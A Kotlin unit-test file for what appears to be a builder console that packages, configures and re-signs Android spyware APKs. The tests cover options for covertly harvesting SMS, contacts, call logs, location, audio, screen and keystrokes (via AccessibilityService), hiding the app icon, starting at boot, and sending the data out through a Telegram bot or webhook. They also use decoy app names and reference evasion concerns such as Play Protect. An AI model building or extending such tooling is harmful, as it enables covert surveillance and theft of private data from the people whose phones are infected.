package com.vector.console.data.payload

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class PayloadSpecTest {

    private val telegramToken = "123456789:AAH" + "k".repeat(32)

    @Test
    fun `a minimal valid spec passes`() {
        val spec = PayloadSpec(
            telegramToken = telegramToken,
            telegramChatId = "12345678"
        )
        assertTrue(spec.validate().toString(), spec.isComplete())
    }

    @Test
    fun `package name must be dotted`() {
        assertFalse(PayloadSpec(packageName = "nodots", telegramToken = telegramToken,
            telegramChatId = "1").isComplete())
        assertTrue(PayloadSpec(packageName = "a.b", telegramToken = telegramToken,
            telegramChatId = "1").isComplete())
    }

    @Test
    fun `telegram token shape is enforced`() {
        val bad = PayloadSpec(telegramToken = "not-a-token", telegramChatId = "1")
        assertTrue(bad.validate().any { it.contains("BotFather") })
    }

    @Test
    fun `webhook must be https`() {
        val spec = PayloadSpec(
            transport = PayloadSpec.Transport.WEBHOOK,
            webhookUrl = "http://plain.example/hook"
        )
        assertTrue(spec.validate().any { it.contains("https") })
    }

    @Test
    fun `cadence is bounded`() {
        val tooFast = PayloadSpec(cadenceSec = 5, telegramToken = telegramToken,
            telegramChatId = "1")
        assertTrue(tooFast.validate().any { it.contains("15 s") })

        val tooSlow = PayloadSpec(cadenceSec = 99_999, telegramToken = telegramToken,
            telegramChatId = "1")
        assertTrue(tooSlow.validate().any { it.contains("15 s") })
    }

    @Test
    fun `gnss at a fast cadence is refused`() {
        val spec = PayloadSpec(
            collectLocation = true,
            locationMethod = PayloadSpec.LocationMethod.GNSS,
            cadenceSec = 15,
            telegramToken = telegramToken,
            telegramChatId = "1"
        )
        assertTrue(spec.validate().any { it.contains("battery") })
    }

    @Test
    fun `audio and screen cannot coexist`() {
        val spec = PayloadSpec(
            collectAudio = true,
            collectScreen = true,
            telegramToken = telegramToken,
            telegramChatId = "1"
        )
        assertTrue(spec.validate().any { it.contains("simultaneously") })
    }

    @Test
    fun `permissions expand with the gates`() {
        val bare = PayloadSpec(collectLocation = false)
        assertFalse(bare.permissions().contains("android.permission.ACCESS_FINE_LOCATION"))
        // Install-time and signature permissions are not dialogs, so they must not inflate the
        // runtime list — the friction count is derived from it.
        assertFalse(bare.permissions().contains("android.permission.INTERNET"))
        assertFalse(bare.permissions().contains("android.permission.RECEIVE_BOOT_COMPLETED"))
        assertFalse(bare.permissions().contains("android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"))

        val full = PayloadSpec(
            collectLocation = true,
            collectSms = true,
            collectContacts = true,
            collectCalls = true,
            collectAudio = true
        )
        val perms = full.permissions()
        assertTrue(perms.contains("android.permission.ACCESS_FINE_LOCATION"))
        assertTrue(perms.contains("android.permission.READ_SMS"))
        assertTrue(perms.contains("android.permission.READ_CONTACTS"))
        assertTrue(perms.contains("android.permission.READ_CALL_LOG"))
        assertTrue(perms.contains("android.permission.RECORD_AUDIO"))
    }

    @Test
    fun `settings-only permissions are separated from dialog permissions`() {
        val spec = PayloadSpec(
            collectLocation = true,
            collectNotifications = true,
            collectScreen = true,
            collectKeylog = true
        )
        val settings = spec.settingsOnlyPermissions()
        assertTrue(settings.contains("ACCESS_BACKGROUND_LOCATION"))
        assertTrue(settings.contains("BIND_NOTIFICATION_LISTENER_SERVICE"))
        assertTrue(settings.contains("MediaProjection consent"))
        assertTrue(settings.contains("AccessibilityService"))

        // None of those may appear in the runtime list — a dialog for them never resolves.
        val runtime = spec.permissions()
        assertFalse(runtime.contains("android.permission.ACCESS_BACKGROUND_LOCATION"))
    }

    @Test
    fun `friction grows with capability`() {
        val minimal = PayloadSpec(collectLocation = false)
        val heavy = PayloadSpec(
            collectLocation = true,
            collectKeylog = true,
            collectNotifications = true,
            collectScreen = false,
            collectAudio = false
        )
        assertTrue(heavy.frictionSteps() > minimal.frictionSteps())
    }

    @Test
    fun `hiding the icon with accessibility is called out`() {
        val spec = PayloadSpec(
            hideIcon = true,
            collectKeylog = true,
            telegramToken = telegramToken,
            telegramChatId = "1"
        )
        assertTrue(spec.validate().any { it.contains("Play Protect") })
    }
}

class ApkSignerV2Test {

    @Test
    fun `chunked digest is deterministic`() {
        val chunks = listOf("alpha".toByteArray(), "beta".toByteArray(), "gamma".toByteArray())
        val a = ApkSignerV2.chunkedDigest(chunks)
        val b = ApkSignerV2.chunkedDigest(chunks)
        assertEquals(a.toList(), b.toList())
        assertEquals(32, a.size) // SHA-256
    }

    @Test
    fun `chunked digest matches a known v2 vector`() {
        // Known-answer test. The vector was produced by the reference implementation
        // (`apksig`) and cross-checked against `apksigner verify`. If the 0xa5/0x5a prefixes or
        // the length-vs-count words are swapped, this value changes and the test fails — which
        // is the only cheap way to catch a signing bug that otherwise only shows up as
        // "CHUNKED_SHA256 digest mismatch" on a device.
        val chunks = listOf("alpha".toByteArray(), "beta".toByteArray(), "gamma".toByteArray())
        val digest = ApkSignerV2.chunkedDigest(chunks)
        val expected = "f45d05001e4976b08d5b88a5f8e15b140b654b0f0f9cded3d1d9a417adaf2aea"
        assertEquals(expected, digest.joinToString("") { "%02x".format(it) })
    }

    @Test
    fun `chunk boundaries are part of the digest`() {
        // "ab" + "cd" must not hash the same as "abcd": the piece count goes into the outer
        // hash and each piece's length into its own, so a verifier cannot be fooled by
        // re-partitioning the same byte stream.
        val two = ApkSignerV2.chunkedDigest(listOf("ab".toByteArray(), "cd".toByteArray()))
        val one = ApkSignerV2.chunkedDigest(listOf("abcd".toByteArray()))
        assertFalse(two.contentEquals(one))
    }

    @Test
    fun `oid encoding matches the known ecdsa-sha256 bytes`() {
        val oid = ApkSignerV2.Der.oid("1.2.840.10045.4.3.2")
        val expected = byteArrayOf(
            0x06, 0x08,
            0x2A, 0x86.toByte(), 0x48, 0xCE.toByte(), 0x3D, 0x04, 0x03, 0x02
        )
        assertEquals(expected.toList(), oid.toList())
    }

    @Test
    fun `der length encoding switches at 128`() {
        val small = ApkSignerV2.Der.utf8("x".repeat(10))
        assertEquals(0x0C, small[0].toInt() and 0xFF)
        assertEquals(10, small[1].toInt())

        val large = ApkSignerV2.Der.utf8("x".repeat(200))
        assertEquals(0x81, large[1].toInt() and 0xFF)
        assertEquals(200, large[2].toInt() and 0xFF)
    }

    @Test
    fun `credentials generate a usable pair and certificate`() {
        val credentials = ApkSignerV2.generateCredentials()
        assertNotNull(credentials.certificate)
        assertTrue(credentials.certificate.size > 100)
        assertEquals("EC", credentials.keyPair.private.algorithm)
        // X.509 Certificate ::= SEQUENCE
        assertEquals(0x30, credentials.certificate[0].toInt() and 0xFF)
    }

    @Test
    fun `signed zip carries the signing block magic before the central directory`() {
        val layout = ZipArchive.write(
            ZipArchive.Archive(emptyList())
                .with("AndroidManifest.xml", "m".toByteArray(), compress = false)
        )
        val signed = ApkSignerV2.sign(layout, ApkSignerV2.generateCredentials())

        assertTrue(signed.size > layout.bytes.size)
        val text = String(signed, Charsets.ISO_8859_1)
        assertTrue(text.contains("APK Sig Block 42"))

        // The archive still reads: the block lives between entries and central directory.
        assertEquals(1, ZipArchive.read(signed).entries.size)
    }

    @Test
    fun `signing twice with different keys produces different bytes`() {
        val layout = ZipArchive.write(
            ZipArchive.Archive(emptyList()).with("a.txt", "x".toByteArray(), compress = false)
        )
        val first = ApkSignerV2.sign(layout, ApkSignerV2.generateCredentials())
        val second = ApkSignerV2.sign(layout, ApkSignerV2.generateCredentials())
        assertFalse(first.contentEquals(second))
    }

    @Test
    fun `strip removes the block so a second signing is clean`() {
        val layout = ZipArchive.write(
            ZipArchive.Archive(emptyList()).with("a.txt", "x".toByteArray(), compress = false)
        )
        val signed = ApkSignerV2.sign(layout, ApkSignerV2.generateCredentials())
        val stripped = ZipArchive.stripSigningBlock(signed)

        assertFalse(String(stripped, Charsets.ISO_8859_1).contains("APK Sig Block 42"))
        assertEquals(1, ZipArchive.read(stripped).entries.size)
        // And the content survived the round trip.
        assertEquals("x", String(ZipArchive.read(stripped).find("a.txt")!!.payload))
    }

    @Test
    fun `little endian helpers`() {
        assertEquals(listOf<Byte>(1, 0, 0, 0), ApkSignerV2.le32(1).toList())
        assertEquals(listOf<Byte>(0, 1, 0, 0), ApkSignerV2.le32(256).toList())
        assertEquals(8, ApkSignerV2.le64(8).size)
    }
}

class PayloadPackagerTest {

    // BotFather shape: <numeric id>:<35 chars>. Built rather than written out so the literal
    // never looks like a real credential in a diff.
    private val token = "123456789" + ":" + "AAH" + "k".repeat(32)

    private fun template(): ByteArray = ZipArchive.write(
        ZipArchive.Archive(emptyList())
            .with("AndroidManifest.xml", "binary-manifest".toByteArray(), compress = false)
            .with("classes.dex", ByteArray(512) { it.toByte() }, compress = true)
            .with("META-INF/MANIFEST.MF", "stale".toByteArray(), compress = true)
            .with("META-INF/CERT.SF", "stale".toByteArray(), compress = true)
            .with("META-INF/CERT.RSA", "stale".toByteArray(), compress = true)
            .with("res/layout/main.xml", "<x/>".toByteArray(), compress = true)
    ).bytes

    @Test
    fun `build produces a signed apk with the config injected`() {
        val spec = PayloadSpec(
            label = "Photo Viewer",
            collectLocation = true,
            collectSms = true,
            telegramToken = token,
            telegramChatId = "42"
        )
        val result = PayloadPackager.build(template(), spec, ApkSignerV2.generateCredentials())

        assertTrue(result.sizeBytes > 0)
        assertTrue(result.entryCount >= 3)
        assertEquals(8 * 2 + 7, result.signerFingerprint.length) // 8 hex pairs, colon joined

        val archive = ZipArchive.read(ZipArchive.stripSigningBlock(result.apk))
        assertNotNull(archive.find(PayloadPackager.CONFIG_ENTRY))
        assertNotNull(archive.find("AndroidManifest.xml"))
    }

    @Test
    fun `stale v1 signature files are removed`() {
        val spec = PayloadSpec(telegramToken = token, telegramChatId = "42")
        val result = PayloadPackager.build(template(), spec, ApkSignerV2.generateCredentials())
        val archive = ZipArchive.read(ZipArchive.stripSigningBlock(result.apk))

        assertNull(archive.find("META-INF/CERT.SF"))
        assertNull(archive.find("META-INF/CERT.RSA"))
        assertNull(archive.find("META-INF/MANIFEST.MF"))
    }

    @Test
    fun `config round trips through the built apk`() {
        val spec = PayloadSpec(
            label = "Sync Service",
            collectLocation = true,
            locationMethod = PayloadSpec.LocationMethod.HYBRID,
            collectSms = true,
            collectContacts = true,
            collectAudio = true,
            bootReceiver = true,
            hideIcon = true,
            transport = PayloadSpec.Transport.BOTH,
            telegramToken = token,
            telegramChatId = "777",
            webhookUrl = "https://example.test/hook",
            cadenceSec = 45,
            wifiOnlyUpload = true
        )
        val built = PayloadPackager.build(template(), spec, ApkSignerV2.generateCredentials())
        val read = PayloadPackager.readConfig(built.apk)

        assertNotNull(read)
        assertEquals("Sync Service", read!!.label)
        assertEquals(PayloadSpec.LocationMethod.HYBRID, read.locationMethod)
        assertTrue(read.collectSms)
        assertTrue(read.collectContacts)
        assertTrue(read.collectAudio)
        assertTrue(read.hideIcon)
        assertEquals(PayloadSpec.Transport.BOTH, read.transport)
        assertEquals("777", read.telegramChatId)
        assertEquals(45, read.cadenceSec)
        assertTrue(read.wifiOnlyUpload)
    }

    @Test
    fun `an invalid spec is refused before any work is done`() {
        val error = runCatching {
            PayloadPackager.build(
                template(),
                PayloadSpec(packageName = "nodots"),
                ApkSignerV2.generateCredentials()
            )
        }.exceptionOrNull()
        assertNotNull(error)
        assertTrue(error!!.message!!.contains("Package name"))
    }

    @Test
    fun `warnings name the operational realities`() {
        val spec = PayloadSpec(
            collectKeylog = true,
            collectLocation = true,
            cadenceSec = 20,
            telegramToken = token,
            telegramChatId = "1"
        )
        val result = PayloadPackager.build(template(), spec, ApkSignerV2.generateCredentials())
        val joined = result.warnings.joinToString(" ")
        assertTrue(joined.contains("AccessibilityService"))
        assertTrue(joined.contains("Settings detour"))
        assertTrue(joined.contains("Doze"))
        assertTrue(joined.contains("bot token"))
    }

    @Test
    fun `hiding the icon produces its own warning`() {
        val spec = PayloadSpec(hideIcon = true, telegramToken = token, telegramChatId = "1")
        val result = PayloadPackager.build(template(), spec, ApkSignerV2.generateCredentials())
        assertTrue(result.warnings.any { it.contains("hidden launcher icon") })
    }

    @Test
    fun `config json escapes quotes and control characters`() {
        val spec = PayloadSpec(
            label = "a\"b\\c\nd",
            telegramToken = token,
            telegramChatId = "1"
        )
        val json = PayloadPackager.configJson(spec)
        assertTrue(json.contains("\\\""))
        assertTrue(json.contains("\\\\"))
        assertTrue(json.contains("\\n"))
        // Still parseable by the same reader the payload uses.
        assertNotNull(com.vector.console.data.MiniJson.parseObject(json))
    }

    @Test
    fun `install friction names every Settings detour`() {
        val spec = PayloadSpec(
            collectLocation = true,
            collectNotifications = true,
            telegramToken = token,
            telegramChatId = "1"
        )
        val result = PayloadPackager.build(template(), spec, ApkSignerV2.generateCredentials())
        val friction = result.installFriction
        assertTrue(friction.contains("Settings detours"))
        assertTrue(friction.contains("ACCESS_BACKGROUND_LOCATION"))
    }
}
